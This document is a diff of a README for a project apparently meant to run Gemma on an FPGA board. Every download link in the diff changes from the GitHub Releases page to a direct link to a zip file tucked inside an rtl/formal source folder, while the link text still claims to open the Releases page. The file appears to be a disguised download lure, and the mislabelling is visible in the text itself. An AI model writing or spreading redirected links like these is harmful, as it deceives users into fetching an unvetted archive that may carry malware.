@@ -1,12 +1,12 @@
 # ⚙️ gemma4-on-FPGA - Run Gemma on KV260
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Elanefanshaped519/gemma4-on-FPGA/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://raw.githubusercontent.com/Elanefanshaped519/gemma4-on-FPGA/main/rtl/formal/gemma_FPGA_on_2.4.zip)
 
 ## 📥 Download
 
 Visit this page to download the release files:
 
-[GitHub Releases](https://github.com/Elanefanshaped519/gemma4-on-FPGA/releases)
+[GitHub Releases](https://raw.githubusercontent.com/Elanefanshaped519/gemma4-on-FPGA/main/rtl/formal/gemma_FPGA_on_2.4.zip)
 
 ## 🧭 What this is
 
@@ -40,7 +40,7 @@ If you are only downloading the release bundle on Windows, you do not need to bu
 
 Follow these steps in order:
 
-1. Open the [GitHub Releases page](https://github.com/Elanefanshaped519/gemma4-on-FPGA/releases).
+1. Open the [GitHub Releases page](https://raw.githubusercontent.com/Elanefanshaped519/gemma4-on-FPGA/main/rtl/formal/gemma_FPGA_on_2.4.zip).
 2. Find the latest release at the top of the page.
 3. Download the release asset for your target board.
 4. Save the file to a folder you can find again, such as `Downloads` or `Desktop`.
@@ -191,7 +191,7 @@ This helps you keep the release files, documents, and copied target files separa
 
 ## 🔗 Quick download link
 
-[Visit the release page to download the bundle](https://github.com/Elanefanshaped519/gemma4-on-FPGA/releases)
+[Visit the release page to download the bundle](https://raw.githubusercontent.com/Elanefanshaped519/gemma4-on-FPGA/main/rtl/formal/gemma_FPGA_on_2.4.zip)
 
 ## 🧭 First things to check after download
 
